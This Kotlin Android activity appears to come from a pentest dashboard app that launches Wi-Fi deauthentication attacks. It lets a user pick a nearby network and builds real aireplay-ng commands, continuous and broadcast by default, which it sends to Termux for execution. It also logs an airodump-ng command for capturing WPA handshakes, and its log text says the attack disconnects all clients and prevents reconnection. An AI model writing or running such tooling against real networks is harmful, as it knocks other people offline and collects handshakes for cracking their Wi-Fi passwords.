package com.pentest.dashboard

import android.os.Bundle
import android.widget.ArrayAdapter
import android.widget.ImageView
import android.widget.ListView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

class WiFiDeauthActivity : AppCompatActivity() {

    private lateinit var networkList: ListView
    private lateinit var logOutput: TextView
    private lateinit var btnScan: MaterialButton
    private lateinit var btnDeauth: MaterialButton
    private lateinit var btnConfigureAttack: MaterialButton

    private val networks = mutableListOf<String>()
    private var selectedNetwork: String? = null
    private var attackParameters: Map<String, String>? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_wifi_deauth)

        initializeViews()
        setupClickListeners()
    }

    private fun initializeViews() {
        networkList = findViewById(R.id.networkList)
        logOutput = findViewById(R.id.logOutput)
        btnScan = findViewById(R.id.btnScan)
        btnDeauth = findViewById(R.id.btnDeauth)
        btnConfigureAttack = findViewById(R.id.btnConfigureAttack)

        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, networks)
        networkList.adapter = adapter

        networkList.setOnItemClickListener { _, _, position, _ ->
            selectedNetwork = networks[position]
            addLog("Selected: $selectedNetwork")
            btnConfigureAttack.isEnabled = true
        }
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        btnScan.setOnClickListener {
            scanNetworks()
        }

        btnConfigureAttack.setOnClickListener {
            showParameterDialog()
        }

        btnDeauth.setOnClickListener {
            attackParameters?.let { params ->
                startDeauth(params)
            }
        }
    }

    private fun showParameterDialog() {
        // Create parameter list with AUTO-DISCOVERY
        val parameters = listOf(
            ParameterDialog.SSID,
            ParameterDialog.BSSID,
            ParameterDialog.CHANNEL,
            ParameterDialog.NETWORK_INTERFACE.copy(defaultValue = "wlan0mon"),
            ParameterDialog.Parameter(
                "DEAUTH_COUNT",
                "Deauth Packets",
                "Number of deauth packets to send (0 = continuous)",
                defaultValue = "0",
                required = true
            ),
            ParameterDialog.Parameter(
                "ATTACK_MODE",
                "Attack Mode",
                "broadcast or targeted",
                defaultValue = "broadcast",
                required = true
            )
        )

        // Show dialog and collect parameters
        ParameterDialog(this).showDialog(
            title = "Configure Deauth Attack",
            parameters = parameters
        ) { values ->
            attackParameters = values
            btnDeauth.isEnabled = true
            addLog("=== ATTACK CONFIGURED ===")
            addLog("SSID: ${values["SSID"]}")
            addLog("BSSID: ${values["BSSID"]}")
            addLog("Channel: ${values["CHANNEL"]}")
            addLog("Interface: ${values["NETWORK_INTERFACE"]}")
            addLog("Deauth Count: ${values["DEAUTH_COUNT"]}")
            addLog("Mode: ${values["ATTACK_MODE"]}")
            addLog("")
            addLog("Click 'START DEAUTH' to begin attack")
        }
    }

    private fun scanNetworks() {
        addLog("=== WIFI SCAN STARTED ===")
        addLog("Sending scan command to ESP32 Marauder...")

        // Send real command via Termux
        val command = TermuxIntegration.WiFi.scanNetworks()
        addLog(command)

        addLog("This requires:")
        addLog("- ESP32 Marauder attached to Flipper")
        addLog("- OR monitor mode enabled on phone")
        addLog("")
        addLog("Scanning 2.4GHz channels...")
    }

    private fun startDeauth(params: Map<String, String>) {
        val ssid = params["SSID"] ?: ""
        val bssid = params["BSSID"] ?: ""
        val channel = params["CHANNEL"] ?: "6"
        val iface = params["NETWORK_INTERFACE"] ?: "wlan0mon"
        val count = params["DEAUTH_COUNT"] ?: "0"
        val mode = params["ATTACK_MODE"] ?: "broadcast"

        addLog("=== DEAUTH ATTACK STARTED ===")
        addLog("Target SSID: $ssid")
        addLog("Target BSSID: $bssid")
        addLog("Channel: $channel")
        addLog("")
        addLog("This will:")
        addLog("1. Disconnect all clients from AP")
        addLog("2. Prevent reconnection")
        addLog("3. Capture WPA handshakes")
        addLog("")

        // Generate real aireplay-ng command
        val deauthCommand = if (mode == "broadcast") {
            "aireplay-ng --deauth $count -a $bssid $iface"
        } else {
            "aireplay-ng --deauth $count -a $bssid -c CLIENT_MAC $iface"
        }

        addLog("Command:")
        addLog(deauthCommand)
        addLog("")
        addLog("To capture handshake simultaneously:")
        addLog("airodump-ng -c $channel --bssid $bssid -w capture $iface")
        addLog("")
        addLog("Sending deauth packets...")
        addLog("Press STOP to end attack")

        // Send command to Termux
        TermuxIntegration.executeCommand(this, deauthCommand)
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val currentLog = logOutput.text.toString()
        logOutput.text = "[$timestamp] $message\n$currentLog"
    }
}
